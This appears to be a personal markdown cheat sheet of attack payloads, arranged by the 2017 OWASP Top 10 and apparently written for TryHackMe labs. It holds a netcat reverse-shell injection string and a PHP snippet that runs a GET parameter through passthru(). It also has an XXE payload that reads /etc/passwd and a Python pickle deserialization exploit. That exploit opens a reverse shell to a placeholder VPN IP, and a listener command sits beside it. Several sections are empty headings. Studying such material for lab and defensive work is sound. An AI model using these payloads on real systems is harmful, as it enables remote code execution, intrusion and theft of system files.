# [OWASP Top 10](https://owasp.org/www-project-top-ten/2017/)

## [Injection:](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html)

```shell
;nc -e /bin/bash
```

Or use  list of [these](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) reverse shells.

```php
<?php
    if(isset($_GET["commandString"])) {
        $command_string = $_GET["commandString"];

        try {
            passthru($command_string);
        } catch(Error $error) {
            echo "<p class=mt-3><b>$error</b></p>";
        }
    }
?>
```

## [Broken Authentication](https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication.html)

## [Sensitive Data Exposure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure.html)

`sqlite3 <database-name>`: Access the database.

`.tables`: See the tables in the database.

`PRAGMA table_info(<table-name>);`: See the table information.

`SELECT * FROM <table-name>;`: Dump the information from the table.

## [XML External Entity](https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE).html)

- XML Syntax:

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE note SYSTEM "note.dtd">
    <note>
        <to>falcon</to>
        <from>feast</from>
        <heading>hacking</heading>
        <body>XXE attack</body>
    </note>
    ```

- DTD Syntax:

    ```xml
    <!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>
    ```

- XXE Payload Examples:

    ```xml
    <!DOCTYPE replace [<!ENTITY name "feast"> ]>
    <userInfo>
        <firstName>falcon</firstName>
        <lastName>&name;</lastName>
    </userInfo>
    ```

    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
    <root>&read;</root>
    ```

## [Broken Access Control](https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control.html)

## [Security Misconfiguration](https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html)

## [Cross-site Scripting](https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS).html)

[XSS Payloads](http://www.xss-payloads.com/)

## [Insecure Deserialization](https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization.html)

```py
cookie = {"replaceme":payload}

pickle_payload = pickle.dumps(cookie)
encodedPayloadCookie = base64.b64encode(pickle_payload)
resp = make_response(redirect("/myprofile"))
resp.set_cookie("encodedPayload", encodedPayloadCookie)
```

```py
cookie = request.cookies.get("encodedPayload")
cookie - pickle.loads(base64.b64decode(cookie))
```

```shell
nc -lvnp 4444
```

```py
import pickle
import sys
import base64

command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat YOUR_TRYHACKME_VPN_IP 4444 > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))
```

## [Components With Known Vulnerabilities](https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities.html)

[ExploitDB](https://www.exploit-db.com/)

## [Insufficient Logging and Monitoring](https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring.html)